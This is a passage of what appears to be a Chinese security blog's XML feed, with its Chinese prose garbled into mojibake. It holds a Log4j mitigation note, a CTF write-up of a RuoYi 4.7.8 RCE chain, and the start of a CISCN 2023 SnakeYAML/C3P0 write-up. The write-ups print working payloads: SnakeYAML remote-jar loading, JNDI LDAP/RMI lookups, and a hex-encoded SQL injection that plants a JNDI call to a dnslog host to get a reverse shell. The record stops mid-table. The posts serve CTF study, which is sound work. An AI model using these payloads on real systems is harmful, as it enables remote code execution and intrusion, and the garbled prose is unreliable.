ä¸ªçº§åˆ«çš„æ—¥å¿—éƒ½å¯èƒ½è¢«åˆ©ç”¨ã€‚</p><p>æ›´è¯¦ç»†çš„åˆ©ç”¨è¿‡ç¨‹åŠç»•è¿‡å¯ä»¥çœ‹ï¼š<a href="https://su18.org/post/log4j2/">Log4j2ï¼šé‡Œç¨‹ç¢‘å¼çš„é¡¶çº§ä¾›åº”é“¾æ¼æ´ | ç´ åå…« (su18.org)</a></p><h3 id="Defend"><a href="#Defend" class="headerlink" title="Defend"></a>Defend</h3><ul><li>å‡çº§åˆ°<code>2.17.0</code>ç‰ˆæœ¬ä»¥ä¸Š</li><li>è®¾ç½®<code>jvm</code>å‚æ•°ï¼š<code>-Dlog4j2.formatMsgNoLookups=true</code></li><li>è®¾ç½®ç¯å¢ƒå˜é‡ï¼š<code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true</code></li></ul><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/log4j2">Log4j | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ruoyi-v4.7.8-RCEåˆ†æ</title>
    <link href="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/"/>
    <url>/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åº”æœ‹å‹çš„é‚€çº¦çœ‹äº†çœ‹CNSSçš„å¤ä»¤è¥é¢˜ï¼ŒåŸºæœ¬æ˜¯å»å¹´æ‹›æ–°çš„åŸé¢˜ï¼Œå¾ˆç®€å•ã€‚å‡ºäº†ä¸€é“ruoyiä¸æ˜¯åŸé¢˜ï¼Œç‰ˆæœ¬æ˜¯4.7.7ï¼Œè¿™é‡Œä¹Ÿæ˜¯ç›´æ¥æ‹¿ä¸‹ä¸€è¡€ï¼Œå€Ÿæ­¤åšä¸€ä¸ªåˆ†æã€‚</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808010612421.png" alt="image-20240808010612421"></p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808010623193.png" alt="image-20240808010623193"></p><p>å…¶å®Ruoyiåœ¨4.7.6ä»¥å‰éƒ½æ˜¯å¯ä»¥ç›´æ¥åœ¨å®šæ—¶ä»»åŠ¡æ‰“snakeyamlå†™å†…å­˜é©¬æˆ–è€…jndiï¼Œä½†æ˜¯4.7.7åæŠŠbeanèƒ½è°ƒç”¨çš„ä¸€äº›classç»™banäº†ï¼Œè€Œä¸”4.7.8å¯ä»¥çœ‹åˆ°é™åˆ¶äº†http(s)&#x2F;ldap&#x2F;rmiçš„æ‰§è¡Œï¼Œå…¶å®ä¸ç®—æ˜¯å®Œå…¨é™åˆ¶ï¼Œåªæ˜¯åœ¨å‡½æ•°å­—ç¬¦ä¸²ä½ç½®é™åˆ¶äº†ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>è°ƒè¯•åˆ†ææˆ‘å°±å·ä¸ªæ‡’ï¼Œè¿™é‡Œæµ…æµ…Copyä¸€ä¸‹~~</p><h3 id="Blacklist-Whitelist"><a href="#Blacklist-Whitelist" class="headerlink" title="Blacklist &amp; Whitelist"></a>Blacklist &amp; Whitelist</h3><p>è¿™é‡Œå…¶å®å°±è·Ÿé‚£äº›åšå®¢å†™çš„ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•èƒ½å¤Ÿä½¿payloadå†™å…¥å®šæ—¶ä»»åŠ¡ï¼Œè¿™é‡Œæˆ‘ä»¬æ‰¾åˆ°çš„æ˜¯sqlæ³¨å…¥çš„æ–¹å¼ï¼Œç”¨åå…­è¿›åˆ¶ç»•è¿‡é™åˆ¶ã€‚</p><p>4.7.6å¾€å‰çš„RCEä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥å®šæ—¶ä»»åŠ¡å†™å…¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.yaml.snakeyaml.Yaml.load(<span class="hljs-string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;you_url_of_jar&quot;]]]]&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æ‰“snakeyamlååºåˆ—åŒ–ï¼Œè¿™é‡Œä¸€èˆ¬ç”¨çš„æ˜¯httpæŠŠyaml-payload.jaræŒ‚vpsä¸Šï¼Œæˆ–è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.naming.InitialContext.lookup(<span class="hljs-string">&#x27;ldap://xxx&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ç›´æ¥è°ƒç”¨lookupæ‰“JNDIã€‚</p><p>ä½†æ˜¯ä½¿ç”¨httpè¿™ç§ä¼šé‡åˆ°ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012333703.png" alt="image-20240808012333703"></p><p>å› ä¸ºåœ¨<code>SysJobController.java</code>é»‘åå•è®¾ç½®ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012423775.png" alt="image-20240808012423775"></p><p>è€Œä¸”è®¾ç½®äº†è®¡åˆ’ä»»åŠ¡ç™½åå•å’Œè¿è§„å­—ç¬¦è¿‡æ»¤ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012501587.png" alt="image-20240808012501587"></p><p>é»‘ç™½åå•åœ¨com&#x2F;ruoyi&#x2F;quartz&#x2F;controller&#x2F;SysJobController#addSaveï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012607310.png" alt="image-20240808012607310"></p><p>å½“é€šè¿‡äº†ä¸Šè¿°æ¡ä»¶åï¼Œåˆ™æ‰§è¡Œ com&#x2F;ruoyi&#x2F;quartz&#x2F;service&#x2F;impl&#x2F;SysJobServiceImpl#insertJobï¼Œå…ˆå°†å®šæ—¶ä»»åŠ¡å†™å…¥æ•°æ®åº“ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012656684.png" alt="image-20240808012656684"></p><p>ç„¶ååˆ›å»ºå®šæ—¶ä»»åŠ¡</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012708444.png" alt="image-20240808012708444"></p><p>ç„¶åå°±æ˜¯å®šæ—¶ä»»åŠ¡æ‰§è¡Œé€»è¾‘ï¼Œè¿›å…¥ com&#x2F;ruoyi&#x2F;quartz&#x2F;util&#x2F;AbstractQuartzJob#execute</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012720314.png" alt="image-20240808012720314"></p><p>ç»§ç»­è·Ÿè¿›ï¼Œè¿›å…¥ invokeMethod æ–¹æ³•</p><p>getInvokeTargetï¼šè°ƒç”¨ç›®æ ‡å­—ç¬¦ä¸²ï¼Œè·å–æ•°æ®åº“ä¸­ invoke_target å­—æ®µ</p><p>getBeanNameï¼šè·å– beanName</p><p>getMethodNameï¼šè·å–æ–¹æ³•å</p><p>getMethodParamsï¼šè·å–å‚æ•°å</p><p>ç„¶ååˆ¤æ–­æ˜¯ä¸æ˜¯å…¨é™å®šç±»åï¼Œè‹¥ä¸æ˜¯åˆ™ä» spring <a href="https://cloud.tencent.com/product/tke?from_column=20065&from=20065">å®¹å™¨</a>ä¸­è·å–</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012736493.png" alt="image-20240808012736493"></p><p>ç»§ç»­è·Ÿè¿› invokeMethod æ–¹æ³•ï¼Œåˆ©ç”¨åå°„æ‰§è¡Œæ–¹æ³•<img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012748530.png" alt="image-20240808012748530"></p><p>ä»ä¸Šå¯åˆ†æå‡ºå¦‚ä¸‹ç»“æœï¼š</p><ol><li>å¯¹è±¡å¯ä»¥æ˜¯ spring å®¹å™¨ä¸­æ³¨å†Œè¿‡çš„ beanï¼Œä¹Ÿå¯ä»¥æŒ‡å®š class åç§°ã€‚</li><li>è‹¥æ˜¯ spring å®¹å™¨ä¸­æ³¨å†Œè¿‡çš„ beanï¼Œåˆ™å¯ç›´æ¥ä» spring å®¹å™¨ä¸­å–å‡ºï¼Œè‹¥æ˜¯æŒ‡å®š class åç§°ï¼Œåˆ™å¯ä»¥é€šè¿‡åå°„ newInstance()åˆ›å»ºå¯¹è±¡ã€‚</li></ol><p>å‰é¢ä¹Ÿè®²åˆ°äº†ç”¨SQLæ³¨å…¥æ¥ç»•é»‘ç™½åå•ï¼Œæ¥ä¸‹æ¥å°±ä»‹ç»è¿™ä¸€éƒ¨åˆ†ã€‚</p><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>åœ¨ ruoyi 4.7.5 ç‰ˆæœ¬ä¹‹å‰ï¼Œåå°æ¥å£<code>/tool/gen/createTable</code>å¤„å­˜åœ¨ sql æ³¨å…¥(CVE-2022-4566)</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012933725.png" alt="image-20240808012933725"></p><p>è€Œ genTableService çš„å®ç°ç±»æ˜¯ GenTableServiceImpl:</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013002895.png" alt="image-20240808013002895"></p><p>å¯¹åº”çš„ Mapper è¯­å¥:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;update id=<span class="hljs-string">&quot;createTable&quot;</span>&gt;<br>       $&#123;sql&#125;<br>&lt;/update&gt;<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013034355.png" alt="image-20240808013034355"></p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a><strong>RCE</strong></h3><p>æ ¹æ®ä¸Šæ–‡å¯çŸ¥ï¼Œruoyi è®¡åˆ’ä»»åŠ¡èƒ½è°ƒç”¨ bean æˆ–è€… class ç±»ï¼ŒSQL æ³¨å…¥ä¾èµ–äº GenTableServiceImpl#createTableã€‚</p><p>å¦‚æœ GenTableServiceImpl æ˜¯ bean å¯¹è±¡ï¼Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨ GenTableServiceImpl#createTable æ‰§è¡Œ SQL è¯­å¥</p><p>åœ¨å¯åŠ¨ç±»ä¸­æ‰“å°æ‰€æœ‰åŠ è½½çš„ beanï¼Œå…¶ä¸­åŒ…æ‹¬ genTableServiceImplï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(RuoYiApplication.class, args);<br><span class="hljs-comment">// è·å–æ‰€æœ‰beançš„åç§°</span><br>String[] beanDefinitionNames = run.getBeanDefinitionNames();<br><span class="hljs-comment">// æ‰“å°æ‰€æœ‰beançš„åç§°</span><br><span class="hljs-keyword">for</span> (String beanDefinitionName : beanDefinitionNames) &#123;<br>    System.out.println(beanDefinitionName);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013103461.png" alt="image-20240808013103461"></p><p>äºæ˜¯å¯ä»¥è°ƒç”¨ genTableServiceImpl.createTable å®ç° sql è¯­å¥æ‰§è¡Œï¼Œæ‰€ä»¥ RCE çš„æ€è·¯ï¼šé…åˆæ³¨å…¥åœ¨ sys_job æ•°æ®è¡¨ä¸­ç›´æ¥æ’å…¥æ¶æ„è®¡åˆ’ä»»åŠ¡ï¼Œå³å¯ä¸è°ƒç”¨ addSave æ–¹æ³•æ·»åŠ è®¡åˆ’ä»»åŠ¡å†…å®¹ï¼ŒæˆåŠŸç»•è¿‡é»‘ç™½åå•é™åˆ¶ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013138821.png" alt="image-20240808013138821"></p><p>è€ŒSQLè¯­å¥æ˜¯æ”¯æŒåå…­è¿›åˆ¶æ“ä½œçš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åœ¨æ·»åŠ SQLå®šæ—¶ä»»åŠ¡æ—¶ï¼Œä½¿ç”¨åå…­è¿›åˆ¶è½¬æ¢ç»•è¿‡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&#x27;UPDATE sys_job SET invoke_target =</span><br><span class="hljs-string">0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f797670307a662e646e736c6f672e636e2729 WHERE job_id = 100;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æˆåŠŸè°ƒç”¨ genTableServiceImpl.createTable æ–¹æ³•ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013251023.png" alt="image-20240808013251023"></p><p>æˆåŠŸä¿®æ”¹ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013336825.png" alt="image-20240808013336825"></p><p>æ‰§è¡Œä»£ç ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013347219.png" alt="image-20240808013347219"></p><p>å¦‚æ­¤è¿™èˆ¬ï¼Œæ‰€æœ‰çš„éƒ½æ‹‰é€šäº†ã€‚</p><p>æ—¢ç„¶è¿™é‡Œå¯ä»¥åå…­è¿›åˆ¶ç»•è¿‡ï¼Œé‚£ä¹ˆæ— è®ºæ˜¯æ‰“Snakeyamlçš„ååºåˆ—åŒ–è¿˜æ˜¯JNDIéƒ½æ˜¯ä¸ºæ‰€æ¬²ä¸ºã€‚</p><h2 id="å›åˆ°é¢˜ç›®"><a href="#å›åˆ°é¢˜ç›®" class="headerlink" title="å›åˆ°é¢˜ç›®"></a>å›åˆ°é¢˜ç›®</h2><p>å› ä¸ºé¢˜ç›®ç”¨çš„å…¬å…±ç¯å¢ƒï¼Œæˆ‘ä¹Ÿä¸æƒ³åˆ«äººè¹­è½¦ï¼ˆå˜»å˜»ï¼‰ï¼Œæ‰€ä»¥å°±æ²¡æ‰“å†…å­˜é©¬ï¼Œç›´æ¥JNDIåå¼¹shellæ‰“çš„ï¼š</p><p>é¦–å…ˆæ˜¯è¿™ä¸ªæ–¹æ³•æµ‹äº†ä¸€ä¸‹DNSï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013647155.png" alt="image-20240808013647155"></p><p>æ”¶åˆ°å›æ˜¾ï¼Œé‚£ä¹ˆç›´æ¥æ¸¸æˆç»“æŸäº†ã€‚</p><p>é¦–å…ˆæˆ‘åˆ›äº†å‡ ä¸ªä»»åŠ¡ï¼Œé‚£ä¸ªcrontè¯­å¥ä»¿ç…§é‚£ä¸ªéšä¾¿å†™å†™å°±å¯ä»¥äº†ï¼Œå¯¹ä¸Šidï¼Œ</p><p>JNDIåŸå§‹payloadï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.naming.InitialContext.lookup(<span class="hljs-string">&#x27;ldap://xxxxxx&#x27;</span>)<br></code></pre></td></tr></table></figure><p>è½¬åå…­è¿›åˆ¶åå†™å…¥ä¸€ä¸ªæ–°åˆ›çš„å®šæ—¶ä»»åŠ¡ï¼ˆè¿™é‡Œæˆ‘æ˜¯å†™å…¥id&#x3D;7çš„å®šæ—¶ä»»åŠ¡é‡Œï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&#x27;UPDATE sys_job SET invoke_target = 0x6a61xxxxx.... WHERE job_id = 7;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨è¡¨ç›˜æ‰“å¼€ä»»åŠ¡çŠ¶æ€ï¼Œåœ¨æ›´å¤šæ“ä½œå¤„é€‰æ‹©æ‰§è¡Œä¸€æ¬¡ï¼Œä¼šå‘ç°id&#x3D;7çš„å®šæ—¶ä»»åŠ¡å·²ç»å†™å…¥payloadï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808014026384.png" alt="image-20240808014026384"></p><p>ç„¶ååœ¨å°†id&#x3D;7çš„å®šæ—¶ä»»åŠ¡æ‰§è¡Œä¸€æ¬¡ï¼ŒJNDIåå¼¹shellï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808014129907.png" alt="image-20240808014129907"></p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808014116572.png" alt="image-20240808014116572"></p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/qq_45813980/article/details/139775272">è‹¥ä¾4.7.8ç‰ˆæœ¬è®¡åˆ’ä»»åŠ¡rceå¤ç°_è‹¥ä¾è®¡åˆ’ä»»åŠ¡rce-CSDNåšå®¢</a></p><p><a href="https://cloud.tencent.com/developer/article/2422994">RuoYi 4.7.8 æ‰§è¡Œä»»æ„SQLè¯­å¥å¯¼è‡´RCEæ¼æ´-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p><p><a href="https://cloud.tencent.com/developer/article/2399994">N&#x2F;Aï½œRuoYi v4.7.8è‹¥ä¾åå°ç®¡ç†ç³»ç»ŸRCEæ¼æ´ï¼ˆPOCï¼‰-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p><p><a href="https://xz.aliyun.com/t/13958?time__1311=GqmxnD2DyGo05DKy+DIx4fx4R2n27T4D#toc-1">æœ€æ–°Ruoyiç»„åˆæ‹³RCEåˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://blog.csdn.net/weixin_45055749/article/details/139200634">ruoyiæ¼æ´pocæ±‡æ€»åŠå…¶åŸç†åˆ†æï¼ˆæºç åˆ†æï¼‰-CSDNåšå®¢</a></p><p><a href="https://github.com/lz2y/yaml-payload-for-ruoyi">lz2y&#x2F;yaml-payload-for-ruoyi: A memory shell for ruoyi (github.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»CISCN2023-ååŒ—-normal_snakeçœ‹Snakeyamlå’ŒC3P0ç¼åˆ</title>
    <link href="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/"/>
    <url>/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>çœ‹æ ‡é¢˜å°±çŸ¥é“è¿™æ¬¡æˆ‘è¦å†™ä»€ä¹ˆï¼Œå°±æ˜¯ç¼åˆæ€ªã€‚</p><p>é™¤äº†Hessianè¿™ç§ç‹¬ç‰¹çš„ååºåˆ—åŒ–æœºåˆ¶ï¼Œä»¥åŠAliyunChain17è¿™ç§ï¼Œå¾ˆå¤šjavaååºåˆ—åŒ–é¢˜ç›®éƒ½æ˜¯ç¼åˆã€‚å†åŠ ä¸Šæå¿ƒæ€çš„é»‘åå•ï¼Œç¼åˆå±æ€§å¤§çˆ†å‘äº†å±äºæ˜¯ã€‚</p><p>è¯ä¸å¤šè¯´ç›´æ¥çœ‹é¢˜ã€‚</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>è¿™é“é¢˜æˆ‘åœ¨åšå®¢å›­å‘è¿‡ä¸€æ¬¡åˆ†æï¼Œè¿™é‡Œä¹Ÿå°±æµ…æµ…è´´ä¸ªé“¾æ¥CVå‡ ä¸‹å·ä¸ªæ‡’~~</p><p>[<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18160178">CISCN 2023 ååŒ—]-normal_snake - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)</a></p><p>&#x2F;readè·¯ç”±ä¸‹ä¼ å‚dataï¼Œpyloadä¸èƒ½åŒ…å«!!ï¼Œç„¶åç”¨äº†yamlæ¥loadä¼ å…¥çš„å‚æ•°ã€‚</p><p>ç¨ä½œäº†è§£ï¼Œè¿™å…¶å®å°±æ˜¯ SnakeYaml ååºåˆ—åŒ–æ¼æ´ï¼Œç¦ç”¨äº† yaml çš„å¸¸ç”¨å¤´ <code>!!</code>ã€‚</p><p>å‰é¢çš„<code>!!</code>æ˜¯ç”¨äºå¼ºåˆ¶ç±»å‹è½¬åŒ–ï¼Œå¼ºåˆ¶è½¬æ¢ä¸º<code>!!</code>åæŒ‡å®šçš„ç±»å‹ï¼Œå…¶å®è¿™ä¸ªå’ŒFastjsonçš„<code>@type</code>æœ‰ç€å¼‚æ›²åŒå·¥ä¹‹å¦™ã€‚ç”¨äºæŒ‡å®šååºåˆ—åŒ–çš„å…¨ç±»åã€‚</p><p>ä½†ç”¨tagå¤´å¯ä»¥ç»•è¿‡ï¼š<a href="https://mp.weixin.qq.com/s/2i6Q9Ob7n0cSxuj9Rob8Uw">å¾®ä¿¡å…¬ä¼—å¹³å° (qq.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">!&lt;tag:yaml.org,<span class="hljs-number">2002</span>:com.sun.rowset.JdbcRowSetImpl&gt;\n dataSourceName: \<span class="hljs-string">&quot;rmi://localhost:1234/Exploit\&quot;\n autoCommit: true</span><br><span class="hljs-string">    </span><br><span class="hljs-string">!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \&quot;rmi://localhost:1234/Exploit\&quot;\n autoCommit: true</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…è¿™æ ·ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">%TAG !      tag:yaml.org,<span class="hljs-number">2002</span>:<br>---<br>!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL [<span class="hljs-string">&quot;http://b1ue.cn/&quot;</span>]]]]<br></code></pre></td></tr></table></figure><p>è€Œ <code>SafeConstructorWithException</code> ä¸­è¿‡æ»¤äº†å¸¸è§çš„ <code>payload</code> å…³é”®å­—ï¼ŒHEX ç¼–ç éƒ¨åˆ†ç¦ç”¨äº† <code>BadAttributeValueExpException</code> å’Œ <code>HotSwappableTargetSource</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkForExceptions</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RuntimeException, RuntimeException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">upperCaseData</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.data.toUpperCase();<br>    <span class="hljs-keyword">if</span> (!upperCaseData.contains(<span class="hljs-string">&quot;JAVA&quot;</span>) &amp;&amp; !upperCaseData.contains(<span class="hljs-string">&quot;JNDI&quot;</span>) &amp;&amp; !upperCaseData.contains(<span class="hljs-string">&quot;JDBC&quot;</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (upperCaseData.contains(<span class="hljs-string">&quot;42616441747472696275746556616C7565457870457863657074696F6E&quot;</span>) || upperCaseData.contains(<span class="hljs-string">&quot;486F74537761707061626C65546172676574536F75726365&quot;</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;No way to pass!&quot;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Unsafe data detected!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹pom.xmlï¼š</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805005147709.png" alt="image-20240805005147709"></p><p>ç»™äº†c3p0ä¾èµ–ï¼Œä¼°è®¡æ˜¯ä»è¿™é‡Œå…¥æ‰‹ï¼š</p><p>åœ¨C3P0ä¸­æœ‰ä¸‰ç§åˆ©ç”¨æ–¹å¼:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">http <span class="hljs-keyword">base</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JNDI</span><br><span class="hljs-keyword"></span>HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨<br></code></pre></td></tr></table></figure><p>åœ¨åŸç”Ÿçš„ååºåˆ—åŒ–ä¸­å¦‚æœæ‰¾ä¸åˆ°å…¶ä»–é“¾ï¼Œåˆ™å¯å°è¯•C3P0å»åŠ è½½è¿œç¨‹çš„ç±»è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚JNDIåˆ™é€‚ç”¨äºJacksonç­‰åˆ©ç”¨ã€‚è€ŒHEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨çš„æ–¹å¼å¯ä»¥åˆ©ç”¨ä¸fjå’ŒJacksonç­‰ä¸å‡ºç½‘æƒ…å†µä¸‹æ‰“å…¥å†…å­˜é©¬ä½¿ç”¨ã€‚</p><p>æŠ„ä¸€ä¸‹ï¼š</p><p><a href="https://www.cnblogs.com/BUTLER/p/17473487.html">2023 ååŒ—åˆ†åŒºèµ› normal_snake - B0T1eR - åšå®¢å›­ (cnblogs.com)</a></p><p>C3P0 ä¸»è¦æœ‰ä»¥ä¸‹åˆ©ç”¨é“¾ï¼š</p><table><thead><tr><th align="left">è§¦å‘ç‚¹</th><th align="left">åŠŸæ•ˆ</th><th align="left">é€‚ç”¨æ€§</th></tr></thead><tbody><tr><td align="left">JndiRefForwardingDataSource#setLoginTimeout â€“ InitialContext#lookup</td><td align="left">Jndi æ³¨å…¥</td><td align="left">fastjson&#x2F;snakeyaml&#x2F;jackson</td></tr><tr><td align="left">WrapperConnectionPoolDataSource#setUserOverridesAsString â€“ ObjectInputStream#readObject</td><td align="left">Hex è§£ç åè§¦å‘åŸç”Ÿååºåˆ—åŒ–</td><td align="left">fastjson&#x2F;snakeyaml&#x2F;jackson</td></tr><tr><td align="left">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject â€“ IndirectlySerialized#getObject() â€“ InitialContext#lookup</td><td align="left">Jndi æ³¨å…¥</td><td align="left">JavaåŸç”Ÿååºåˆ—åŒ–</td></tr><tr><td align="left">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject â€“ IndirectlySerialized#getObject() â€“ com.mchange.v2.naming.ReferenceableUtils#referenceToObject â€“ URLClassLoader</td><td align="left">URLCLassLoader è¿œç¨‹ç±»åŠ è½½</td><td align="left">JavaåŸç”Ÿååºåˆ—åŒ–</td></tr><tr><td align="left">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject â€“ IndirectlySerialized#getObject() â€“ com.mchange.v2.naming.ReferenceableUtils#referenceToObject â€“ BeanFactory#getInstance</td><td align="left">ä¸å‡ºç½‘çš„å‘½ä»¤æ³¨å…¥</td><td 